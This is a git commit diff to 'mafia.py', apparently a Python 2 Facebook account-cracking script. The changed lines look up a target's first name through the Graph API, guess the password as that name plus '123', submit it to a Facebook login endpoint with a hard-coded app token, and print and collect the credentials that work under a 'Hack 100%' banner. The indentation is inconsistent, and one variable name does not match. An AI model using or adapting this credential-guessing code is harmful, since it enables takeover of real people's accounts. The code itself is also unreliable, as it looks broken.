85cc61cc2866c28801117e2352c7b0354a255098
lovehacker <61407838+lovehackerAsif@users.noreply.github.com>
2020-04-13 12:20:37 +0500

    Update mafia.py

--- mafia.py
+++ mafia.py
@@ -321,14 +321,14 @@ def pilih_super():
 			if 'access_token' in q:
 				print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass1
 				oks.append(user+pass1)
-			                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-			                b = json.loads(a.text)
-					pass2 = j['first_name'] + '123'
-					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(data)
-					if 'access_token' in q:
-						print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass2
-						oks.append(user+pass2)
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+		        b = json.loads(a.text)
+		        pass2 = j['first_name'] + '123'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass2
+				oks.append(user+pass2)
 				                        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			                                b = json.loads(a.text)
 					                pass3 = b['first_name'] + '123'
